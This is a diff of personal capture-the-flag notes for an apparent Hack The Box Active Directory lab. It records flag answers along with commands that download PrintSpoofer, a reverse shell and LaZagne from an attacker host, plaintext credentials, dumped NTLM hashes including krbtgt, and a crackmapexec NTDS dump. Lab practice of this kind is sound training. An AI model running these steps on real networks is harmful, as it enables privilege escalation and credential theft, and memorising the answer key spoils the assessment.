@@ -61,7 +61,8 @@ Output: User ID=netdb;Password=D@ta_bAse_adm1n!"
 
 
 Question 7 - Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. - s3imp3rs0nate_cl@ssic
-
+1) log into htb-student ssh 
+2)
 i neeed to come back to thsi and write the steps out cause holy shit. 
 
 scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sesseion run python3 -m http.server THEN -> 
@@ -69,21 +70,29 @@ scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sess
 Invoke-WebRequest -URI http://172.16.7.240:8000/PrintSpoofer64.exe -OutFile .\PrintSpoofer.exe
 Invoke-WebRequest -URI http://172.16.7.240:8000/shell.exe -OutFile .\rshell.exe
 
-Question 8 - Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
+Question 8 - Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host. - exc3ss1ve_adm1n_r1ights! 
 scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sesseion run python3 -m http.server THEN ->
 
 Invoke-WebRequest -URI http://172.16.7.240:8000/LaZagne.exe -OutFile .\LaZagne.exe -> make suer we are loading this to 172.16.7.60 ? i think.. this is the SQL box? 
 
 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:136b3ddfbb62cb02e53a8f661248f364:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+
 Question 9 - Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
 
 
-
-Question 10 -  Crack this user's password hash and submit the cleartext password as your answer.
-
+proxychains xfreerdp /v:172.16.7.50 /u:BRO86 /p:Welcome! /drive:shared,/home/htb-ac-1235531/Desktop 
 
 
-Question 11 -  Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
+Question 10 -  Crack this user's password hash and submit the cleartext password as your answer. - charlie1 
 
 
-Question 12 -  Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
+
+Question 11 -  Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. - acLs_f0r_th3_w1n! 
+
+
+Question 12 -  Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. -krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f::: 
+From regular ssh htb session -> crackmapexec smb -u CT059 -p charlie1 -d INLANEFREIGHT.LOCAL 172.16.7.3 --ntds -> AFTER adding CT059 to Domain Admins 
